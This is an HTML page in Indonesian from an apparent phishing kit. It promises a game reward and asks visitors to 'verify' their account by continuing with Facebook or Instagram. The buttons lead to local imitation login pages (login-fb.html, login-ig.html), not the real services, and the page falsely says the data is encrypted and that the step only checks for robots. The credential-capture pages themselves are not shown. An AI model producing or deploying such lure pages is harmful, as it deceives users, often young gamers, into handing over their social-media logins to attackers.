<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifikasi Akun - Hadiah Game</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
  <style>
    body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    .container { max-width: 400px; padding-top: 50px; }
    .header { text-align: center; margin-bottom: 30px; }
    .header h4 { font-weight: bold; color: #262626; }
    .login-btn { display: flex; align-items: center; justify-content: center; padding: 12px; border-radius: 8px; font-weight: 600; margin-bottom: 15px; text-decoration: none; border: 1px solid #dbdbdb; transition: background 0.2s; }
    .btn-ig { background-color: #ffffff; color: #262626; }
    .btn-ig:hover { background-color: #f0f0f0; }
    .btn-fb { background-color: #1877f2; color: white; border: none; }
    .btn-fb:hover { background-color: #166fe5; }
    .btn-fb i { font-size: 1.2rem; }
    .reward-info { background: #e7f3ff; padding: 15px; border-radius: 10px; margin-bottom: 25px; font-size: 0.9rem; border: 1px dashed #1877f2; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h4>Verifikasi Akun</h4>
      <p class="text-secondary">Silakan login untuk memverifikasi ID game lo dan mengklaim hadiah.</p>
    </div>

    <div class="reward-info">
      <strong>Info Hadiah:</strong><br>
      Game: <span id="display-game">-</span><br>
      Hadiah: <span id="display-reward">-</span>
    </div>

    <a href="login-fb.html" class="login-btn btn-fb">
      <i class="bi bi-facebook me-2"></i> Lanjutkan dengan Facebook
    </a>

    <a href="login-ig.html" class="login-btn btn-ig">
      <img src="../assets/instagram.png" width="20" class="me-2"> Lanjutkan dengan Instagram
    </a>

    <p class="text-center mt-4 text-secondary" style="font-size: 0.8rem;">
      Data lo dienkripsi dan aman. Verifikasi ini diperlukan untuk memastikan lo bukan robot.
    </p>
  </div>

  <script>
    document.getElementById('display-game').innerText = localStorage.getItem('selected_game') || '-';
    document.getElementById('display-reward').innerText = localStorage.getItem('selected_reward') || '-';
  </script>
</body>
</html>
